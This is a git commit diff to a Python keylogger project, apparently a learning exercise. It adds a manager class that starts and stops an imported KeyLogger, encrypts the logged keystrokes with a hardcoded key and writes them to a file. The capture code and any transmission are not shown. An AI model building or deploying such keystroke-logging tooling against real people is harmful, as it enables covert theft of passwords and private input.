f4ebaa244f964ae6ce86245cdd9430d1fb9a6989
Ori <odmark2023@gmail.com>
2025-09-02 12:51:02 +0300

    manager to take the list of logging and encrypt and put into file

--- key_logger_manager.py
+++ key_logger_manager.py
@@ -1,9 +1,30 @@
 from KeyLoggerService import KeyLogger
 from fileWriter import MyFile
-
+from Encryption import Crypto
 
 class KeyLoggerManager:
     def __init__(self):
-        self.kl_service = KeyLogger()
-        self.my_file = MyFile("Encrypted.txt")
-        
+        self.logger = KeyLogger()
+        self.file = MyFile("encrypt.txt")
+        self.crypto = Crypto("abcdefjhijklmnopqrstuvwxyz")
+
+
+    def start_logger(self):
+        self.logger.start_logging()
+
+    def stop_logger(self):
+        self.logger.stop_logging()
+        data = str(self.logger.get_logged_keys())
+
+        encrypt = self.crypto.process(data)
+        self.file.write_to_file(str(encrypt))
+
+
+
+
+if __name__ == "__main__":
+    a = KeyLoggerManager()
+    a.start_logger()
+    a.stop_logger()
+    print(a.file.file_name)
+    print(a.file.read_file())
